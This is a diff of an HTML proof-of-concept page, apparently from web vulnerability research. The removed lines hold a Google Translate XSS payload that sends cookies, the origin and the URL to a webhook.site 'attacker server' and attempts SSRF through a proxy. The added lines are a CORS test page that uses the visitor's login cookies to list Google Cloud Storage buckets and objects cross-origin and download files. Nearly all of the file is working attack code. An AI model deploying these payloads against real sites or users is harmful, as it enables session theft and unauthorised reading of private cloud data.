@@ -1,47 +1,233 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Google UploadServer CORS PoC — GCS Data Exfiltration</title>
+    <style>
+        body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 900px; margin: 0 auto; }
+        h1 { color: #58a6ff; }
+        .test { background: #161b22; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #30363d; }
+        .test.pass { border-left-color: #3fb950; }
+        .test.fail { border-left-color: #f85149; }
+        .test.waiting { border-left-color: #d29922; }
+        button { background: #238636; color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; margin: 3px; }
+        button:hover { background: #2ea043; }
+        button.danger { background: #da3633; }
+        pre { background: #0d1117; border: 1px solid #30363d; padding: 10px; overflow-x: auto; font-size: 12px; max-height: 300px; overflow-y: auto; }
+        .result { margin-top: 10px; }
+        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; min-height: 200px; max-height: 500px; overflow-y: auto; }
+        .log-entry { margin: 3px 0; }
+        .log-pass { color: #3fb950; }
+        .log-fail { color: #f85149; }
+        .log-info { color: #58a6ff; }
+        .log-data { color: #d2a8ff; }
+    </style>
+</head>
 <body>
-<h1>Google Translate XSS PoC</h1>
-<div id="proof"></div>
-<script>
-// Proof 1: Show execution context on page
-var info = "domain=" + document.domain + " | origin=" + location.origin;
-document.getElementById("proof").innerHTML = "<h2>JS executed in: " + document.domain + "</h2>";
+    <h1>Google UploadServer CORS PoC</h1>
+    <p>Tests whether Google Cloud Storage API is readable cross-origin with victim's cookies.</p>
+    <p><strong>Prerequisite:</strong> Be logged into <a href="https://console.cloud.google.com" target="_blank" style="color:#58a6ff">Google Cloud Console</a> in this browser.</p>
 
-// Proof 2: Exfiltrate to attacker server (REPLACE with your webhook.site URL)
-var webhook = "https://webhook.site/a7d60277-1282-4a05-85da-2e13e3f6e459";
-new Image().src = webhook + "?domain=" + encodeURIComponent(document.domain)
-  + "&origin=" + encodeURIComponent(location.origin)
-  + "&cookie=" + encodeURIComponent(document.cookie)
-  + "&url=" + encodeURIComponent(location.href);
+    <div class="test" id="test1-box">
+        <h3>Test 1: CORS Verification (Public Bucket — No Auth Needed)</h3>
+        <p>Confirms the CORS misconfiguration exists by reading a public GCS bucket.</p>
+        <button onclick="test1()">Run Test 1</button>
+        <div class="result" id="test1-result"></div>
+    </div>
 
-// Proof 3: Steal the page HTML (translate.goog content)
-fetch(location.href, {credentials: 'include'})
-  .then(r => r.text())
-  .then(html => {
-    document.getElementById("proof").innerHTML += "<h2>Page stolen: " + html.length + " bytes</h2>";
-    // Send stolen page to attacker
-    fetch(webhook, {
-      method: "POST",
-      body: JSON.stringify({
-        domain: document.domain,
-        origin: location.origin,
-        cookies: document.cookie,
-        pageLength: html.length,
-        proof: "XSS executing in translate.goog context"
-      }),
-      headers: {"Content-Type": "text/plain"}
-    });
-  });
+    <div class="test" id="test2-box">
+        <h3>Test 2: List YOUR GCP Projects (Requires Login)</h3>
+        <p>Attempts to list your GCP projects cross-origin. If this works, cookie auth is confirmed.</p>
+        <button onclick="test2()">Run Test 2</button>
+        <div class="result" id="test2-result"></div>
+    </div>
 
-// Proof 4: Access Google's translate CORS proxy from our script
-fetch("/3cbab51d-6f44-4569-b131-140fd3802204/ajax?u=" + encodeURIComponent("https://httpbin.org/ip"))
-  .then(r => r.text())
-  .then(data => {
-    document.getElementById("proof").innerHTML += "<h2>SSRF via Google proxy: " + data.substring(0,100) + "</h2>";
-  })
-  .catch(e => {
-    document.getElementById("proof").innerHTML += "<h2>Proxy fetch: " + e.message + "</h2>";
-  });
-</script>
+    <div class="test" id="test3-box">
+        <h3>Test 3: List YOUR GCS Buckets (Requires Login + Project)</h3>
+        <p>Enter your GCP project ID to list its buckets cross-origin.</p>
+        <input type="text" id="projectId" placeholder="your-project-id" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
+        <button onclick="test3()">Run Test 3</button>
+        <div class="result" id="test3-result"></div>
+    </div>
+
+    <div class="test" id="test4-box">
+        <h3>Test 4: List Objects in a Bucket (Requires Login)</h3>
+        <p>Enter a bucket name to list its objects cross-origin.</p>
+        <input type="text" id="bucketName" placeholder="your-bucket-name" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
+        <button onclick="test4()">Run Test 4</button>
+        <div class="result" id="test4-result"></div>
+    </div>
+
+    <div class="test" id="test5-box">
+        <h3>Test 5: Download a File from GCS (Requires Login)</h3>
+        <p>Enter bucket and object path to download cross-origin.</p>
+        <input type="text" id="dlBucket" placeholder="bucket-name" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:200px;">
+        <input type="text" id="dlObject" placeholder="path/to/file.txt" style="padding:5px; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; width:300px;">
+        <button class="danger" onclick="test5()">Run Test 5 (Downloads File)</button>
+        <div class="result" id="test5-result"></div>
+    </div>
+
+    <h2>Live Log</h2>
+    <div id="log"></div>
+
+    <script>
+    function log(msg, cls) {
+        var el = document.getElementById('log');
+        var entry = document.createElement('div');
+        entry.className = 'log-entry ' + (cls || 'log-info');
+        entry.textContent = new Date().toLocaleTimeString() + ' | ' + msg;
+        el.appendChild(entry);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function setBox(id, status) {
+        document.getElementById(id).className = 'test ' + status;
+    }
+
+    // Test 1: Public bucket — confirms CORS works
+    function test1() {
+        log('Test 1: Fetching public GCS bucket listing cross-origin...', 'log-info');
+        setBox('test1-box', 'waiting');
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b/gcp-public-data-landsat/o?maxResults=3', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var data = JSON.parse(xhr.responseText);
+                var items = data.items || [];
+                log('CORS CONFIRMED — read ' + items.length + ' objects from public bucket', 'log-pass');
+                log('Server: ' + xhr.getResponseHeader('Server'), 'log-data');
+                log('ACAO: ' + xhr.getResponseHeader('Access-Control-Allow-Origin'), 'log-data');
+                log('ACAC: ' + xhr.getResponseHeader('Access-Control-Allow-Credentials'), 'log-data');
+                document.getElementById('test1-result').innerHTML = '<pre>' + JSON.stringify(data, null, 2).substring(0, 1000) + '</pre>';
+                setBox('test1-box', 'pass');
+            } else {
+                log('Test 1 failed: HTTP ' + xhr.status, 'log-fail');
+                setBox('test1-box', 'fail');
+            }
+        };
+        xhr.onerror = function() {
+            log('Test 1: CORS BLOCKED by browser — no cross-origin access', 'log-fail');
+            setBox('test1-box', 'fail');
+        };
+        xhr.send();
+    }
+
+    // Test 2: List projects — proves cookie auth works cross-origin
+    function test2() {
+        log('Test 2: Attempting to list YOUR GCP projects cross-origin...', 'log-info');
+        setBox('test2-box', 'waiting');
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b?project=_', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            log('Test 2 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
+            if (xhr.status === 200) {
+                log('YOUR BUCKETS ARE READABLE CROSS-ORIGIN!', 'log-pass');
+                document.getElementById('test2-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 2000) + '</pre>';
+                setBox('test2-box', 'pass');
+            } else {
+                var body = xhr.responseText.substring(0, 500);
+                log('Response: ' + body, 'log-data');
+                document.getElementById('test2-result').innerHTML = '<pre>' + body + '</pre>';
+                if (body.includes('Login Required') || body.includes('UNAUTHENTICATED')) {
+                    log('Cookie auth NOT sent — googleapis.com may not use cookie auth for this API', 'log-fail');
+                    log('This means CORS headers exist but cookies are not the auth mechanism', 'log-info');
+                } else if (body.includes('required parameter')) {
+                    log('Auth worked but missing project param — try Test 3 with a project ID', 'log-pass');
+                }
+                setBox('test2-box', 'fail');
+            }
+        };
+        xhr.onerror = function() {
+            log('Test 2: Request blocked entirely', 'log-fail');
+            setBox('test2-box', 'fail');
+        };
+        xhr.send();
+    }
+
+    // Test 3: List buckets in a specific project
+    function test3() {
+        var project = document.getElementById('projectId').value;
+        if (!project) { log('Enter a project ID first', 'log-fail'); return; }
+        log('Test 3: Listing buckets in project "' + project + '"...', 'log-info');
+        setBox('test3-box', 'waiting');
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b?project=' + encodeURIComponent(project), true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            log('Test 3 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
+            var body = xhr.responseText.substring(0, 3000);
+            document.getElementById('test3-result').innerHTML = '<pre>' + body + '</pre>';
+            if (xhr.status === 200) {
+                var data = JSON.parse(xhr.responseText);
+                var buckets = data.items || [];
+                log('CRITICAL: Read ' + buckets.length + ' private buckets from project ' + project, 'log-pass');
+                buckets.forEach(function(b) { log('  Bucket: ' + b.name, 'log-data'); });
+                setBox('test3-box', 'pass');
+            } else {
+                setBox('test3-box', 'fail');
+            }
+        };
+        xhr.onerror = function() { log('Test 3 blocked', 'log-fail'); setBox('test3-box', 'fail'); };
+        xhr.send();
+    }
+
+    // Test 4: List objects in a bucket
+    function test4() {
+        var bucket = document.getElementById('bucketName').value;
+        if (!bucket) { log('Enter a bucket name first', 'log-fail'); return; }
+        log('Test 4: Listing objects in bucket "' + bucket + '"...', 'log-info');
+        setBox('test4-box', 'waiting');
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://www.googleapis.com/storage/v1/b/' + encodeURIComponent(bucket) + '/o?maxResults=10', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            log('Test 4 response: HTTP ' + xhr.status, xhr.status < 400 ? 'log-pass' : 'log-fail');
+            var body = xhr.responseText.substring(0, 3000);
+            document.getElementById('test4-result').innerHTML = '<pre>' + body + '</pre>';
+            if (xhr.status === 200) {
+                var data = JSON.parse(xhr.responseText);
+                var items = data.items || [];
+                log('Read ' + items.length + ' objects from bucket ' + bucket, 'log-pass');
+                items.forEach(function(o) { log('  Object: ' + o.name + ' (' + o.size + ' bytes)', 'log-data'); });
+                setBox('test4-box', 'pass');
+            } else {
+                setBox('test4-box', 'fail');
+            }
+        };
+        xhr.onerror = function() { log('Test 4 blocked', 'log-fail'); setBox('test4-box', 'fail'); };
+        xhr.send();
+    }
+
+    // Test 5: Download a file
+    function test5() {
+        var bucket = document.getElementById('dlBucket').value;
+        var object = document.getElementById('dlObject').value;
+        if (!bucket || !object) { log('Enter bucket and object path', 'log-fail'); return; }
+        log('Test 5: Downloading ' + bucket + '/' + object + '...', 'log-info');
+        setBox('test5-box', 'waiting');
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://www.googleapis.com/download/storage/v1/b/' + encodeURIComponent(bucket) + '/o/' + encodeURIComponent(object) + '?alt=media', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            log('Test 5 response: HTTP ' + xhr.status + ' (' + xhr.responseText.length + ' bytes)', xhr.status < 400 ? 'log-pass' : 'log-fail');
+            if (xhr.status === 200) {
+                log('FILE DOWNLOADED CROSS-ORIGIN: ' + xhr.responseText.length + ' bytes', 'log-pass');
+                document.getElementById('test5-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 2000) + '</pre>';
+                setBox('test5-box', 'pass');
+            } else {
+                document.getElementById('test5-result').innerHTML = '<pre>' + xhr.responseText.substring(0, 1000) + '</pre>';
+                setBox('test5-box', 'fail');
+            }
+        };
+        xhr.onerror = function() { log('Test 5 blocked', 'log-fail'); setBox('test5-box', 'fail'); };
+        xhr.send();
+    }
+    </script>
 </body>
 </html>
